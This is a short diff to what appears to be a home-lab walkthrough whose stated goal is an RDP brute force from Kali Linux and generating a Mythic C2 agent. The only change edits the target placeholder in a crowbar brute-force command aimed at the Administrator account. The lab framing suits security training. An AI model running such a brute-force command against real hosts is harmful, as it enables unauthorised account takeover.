@@ -58,7 +58,7 @@ Goal: Perform an RDP brute force attack using Kali Linux, generate a Mythic C2 a
         
 4. **Run Brute Force Attack**
     
-    `crowbar -b rdp -u Administrator -C Challenge-Wordlist.txt -s <Challenge-WIN-Haji-IP>/32`
+    `crowbar -b rdp -u Administrator -C Challenge-Wordlist.txt -s <MYDFIR-WIN-emaan-IP>/32`
     
 5. **Successful Login**
     
